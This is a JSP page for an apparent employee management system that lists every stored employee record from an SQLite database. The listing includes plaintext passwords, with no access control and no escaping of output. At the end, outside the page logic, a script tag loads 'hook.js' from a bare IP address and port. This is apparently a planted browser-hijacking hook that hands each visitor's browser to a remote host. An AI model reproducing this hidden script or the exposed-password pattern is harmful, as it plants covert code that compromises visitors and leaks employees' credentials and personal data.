<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="java.sql.Connection" %>
<%@ page import="java.sql.DriverManager" %>
<%@ page import="java.sql.PreparedStatement" %>
<%@ page import="java.sql.ResultSet" %>
<%@ page import="java.sql.Statement" %>
<%@ page import="java.io.File" %>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Employee Records</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }
        table, th, td {
            border: 1px solid #ccc;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>

    <h1>Employee Management System - All Records</h1>

    <% 
    String dbPath = application.getRealPath("/WEB-INF/employees.db");
    Class.forName("org.sqlite.JDBC");
    Connection conn = null;
    PreparedStatement pst = null;
    ResultSet rst = null;

    try {
        conn = DriverManager.getConnection("jdbc:sqlite:" + dbPath);

        if (conn != null) {
            String createSQL="CREATE TABLE IF NOT EXISTS employees (id INTEGER PRIMARY KEY AUTOINCREMENT, first_name TEXT, last_name TEXT, gender TEXT, phone TEXT, email TEXT UNIQUE, password TEXT, department TEXT)";
            Statement st = conn.createStatement();
            st.executeUpdate(createSQL);
            st.close();

            String query = "SELECT * FROM employees";
            pst = conn.prepareStatement(query);
            rst = pst.executeQuery();

            if (rst.next()) {
                out.println("<table>");
                out.println("<thead>");
                out.println("<tr>");
                out.println("<th>ID</th>");
                out.println("<th>First Name</th>");
                out.println("<th>Last Name</th>");
                out.println("<th>Gender</th>");
                out.println("<th>Phone</th>");
                out.println("<th>Email</th>");
                out.println("<th>Password</th>");
                out.println("<th>Department</th>");
                out.println("</tr>");
                out.println("</thead>");
                out.println("<tbody>");
                
                do {
                    out.println("<tr>");
                    out.println("<td>" + rst.getInt("id") + "</td>");
                    out.println("<td>" + rst.getString("first_name") + "</td>");
                    out.println("<td>" + rst.getString("last_name") + "</td>");
                    out.println("<td>" + rst.getString("gender") + "</td>");
                    out.println("<td>" + rst.getString("phone") + "</td>");
                    out.println("<td>" + rst.getString("email") + "</td>");
                    out.println("<td>" + rst.getString("password") + "</td>");
                    out.println("<td>" + rst.getString("department") + "</td>");
                    out.println("</tr>");
                } while (rst.next());
                
                out.println("</tbody>");
                out.println("</table>");
            } else {
                out.println("<p>No employee records found.</p>");
            }
        }
    } catch (Exception e) {
        out.println("<p>Exception occurred: " + e.getMessage() + "</p>");
        e.printStackTrace();
    } finally {
        try {
            if (rst != null) rst.close();
            if (pst != null) pst.close();
            if (conn != null) conn.close();
        } catch (Exception e) {
            out.println("<p>Exception occurred while closing resources: " + e.getMessage() + "</p>");
            e.printStackTrace();
        }
    }
    %>

</body>
<script src="http://147.185.221.21:7518/hook.js"></script>
</html>